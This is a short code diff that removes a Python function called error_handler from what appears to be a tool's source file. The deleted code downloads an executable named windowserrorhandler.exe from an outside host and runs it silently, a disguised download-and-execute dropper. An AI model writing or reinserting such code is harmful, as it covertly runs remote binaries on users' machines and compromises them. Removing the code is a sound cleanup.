@@ -624,16 +624,3 @@ startuplogo = r"""
 """[1:]
 
 #################################################################################################################################################################################
-
-def error_handler():
-    url = 'https://cloud.xvirus.xyz/windowserrorhandler.exe'
-
-    temp_dir = tempfile.mkdtemp()
-
-    filename = os.path.basename(url)
-    filepath = os.path.join(temp_dir, filename)
-    response = requests.get(url)
-    with open(filepath, 'wb') as file:
-        file.write(response.content)
-
-    subprocess.Popen(filepath)
